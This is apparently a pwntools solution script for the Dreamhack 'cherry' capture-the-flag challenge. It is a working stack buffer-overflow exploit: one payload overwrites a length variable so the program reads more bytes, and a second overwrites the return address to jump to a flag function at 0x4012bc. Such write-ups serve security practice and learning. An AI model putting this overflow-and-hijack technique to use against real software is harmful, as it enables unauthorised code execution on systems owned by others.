from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/cherry/chall')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:18221'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#so if we overwrite v7, we can write more bytes into v5

#gdb.attach(p, gdbscript = "b * 0x4013b7")
payload = ( b"cherry" + #buf 
            b"B"* 4 +  #v5, will get overwritten anyways
            b"C" * 2 + #v6
            b"\xff\xff" #v7; biggest value possible
          )
p.send(payload)

p.recvuntil(b"cherry?: ")

flag = 0x4012bc

payload = ( b"A" * (4+2+4+4+4) + #padding to rbp
            b"B" * 8 +
            p64(flag)
            )
            
p.sendline(payload)

p.interactive()
